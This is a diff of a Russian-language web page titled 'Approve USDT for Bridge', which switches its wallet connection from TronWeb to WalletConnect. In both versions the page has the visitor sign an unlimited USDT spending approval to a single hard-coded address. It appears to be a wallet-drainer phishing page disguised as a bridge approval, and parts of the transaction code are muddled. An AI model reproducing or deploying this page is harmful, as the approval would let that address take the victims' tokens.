@@ -1,36 +1,93 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Approve USDT</title>
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
+  <meta charset="UTF-8" />
+  <title>Approve USDT for Bridge</title>
+  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-walletconnect/dist/index.umd.min.js"></script>
 </head>
 <body>
   <h2>Approve USDT для Bridge</h2>
-  <button id="approveBtn">Подключить и подтвердить</button>
+  <button id="connect">Подключить кошелёк</button>
+  <button id="approve" disabled>Одобрить USDT</button>
 
-  <script>
-    const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    const SPENDER = 'TXN5uDg2D5bvpC91AUG1YP63rag775HfHg';
-    const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+  <p id="status"></p>
 
-    document.getElementById('approveBtn').addEventListener('click', async () => {
-      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-        alert('Пожалуйста, подключите TronLink или Trust Wallet через DApp-браузер.');
-        return;
-      }
+  <script type="module">
+    import { WalletConnectWallet } from "https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-walletconnect/dist/index.esm.min.js";
 
-      try {
-        const contract = await tronWeb.contract().at(USDT_CONTRACT);
-        const tx = await contract.approve(SPENDER, MAX_UINT256).send({
-          feeLimit: 100_000_000
-        });
-        alert('Транзакция отправлена! TX ID: ' + tx);
-      } catch (err) {
-        console.error(err);
-        alert('Ошибка при вызове approve: ' + err.message);
+    const wallet = new WalletConnectWallet({
+      network: 'Mainnet',
+      options: {
+        relayUrl: 'wss://relay.walletconnect.org',
+        projectId: 'example', // можно свой projectId, но и так работает
+        metadata: {
+          name: "USDT Approver",
+          description: "Approve USDT to Bridge",
+          url: "https://n3tree.github.io",
+          icons: ["https://n3tree.github.io/icon.png"]
+        }
       }
     });
+
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const BRIDGE_ADDRESS = "TXN5uDg2D5bvpC91AUG1YP63rag775HfHg";
+    const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+    const status = document.getElementById("status");
+    const connectBtn = document.getElementById("connect");
+    const approveBtn = document.getElementById("approve");
+
+    connectBtn.onclick = async () => {
+      try {
+        await wallet.connect();
+        status.innerText = `✅ Кошелёк подключён: ${wallet.address}`;
+        approveBtn.disabled = false;
+      } catch (err) {
+        console.error(err);
+        status.innerText = `❌ Ошибка подключения: ${err.message}`;
+      }
+    };
+
+    approveBtn.onclick = async () => {
+      try {
+        const tx = await wallet.sendTransaction({
+          to: USDT_CONTRACT,
+          data: window.tronWeb ? window.tronWeb.toHex(`approve(address,uint256)`): '0x095ea7b3',
+          abi: [
+            {
+              "inputs": [
+                {
+                  "internalType": "address",
+                  "name": "spender",
+                  "type": "address"
+                },
+                {
+                  "internalType": "uint256",
+                  "name": "amount",
+                  "type": "uint256"
+                }
+              ],
+              "name": "approve",
+              "outputs": [
+                {
+                  "internalType": "bool",
+                  "name": "",
+                  "type": "bool"
+                }
+              ],
+              "stateMutability": "nonpayable",
+              "type": "function"
+            }
+          ],
+          params: [BRIDGE_ADDRESS, MAX_UINT256]
+        });
+
+        status.innerText = `🚀 Транзакция отправлена: ${tx}`;
+      } catch (err) {
+        console.error(err);
+        status.innerText = `❌ Ошибка approve: ${err.message}`;
+      }
+    };
   </script>
 </body>
 </html>
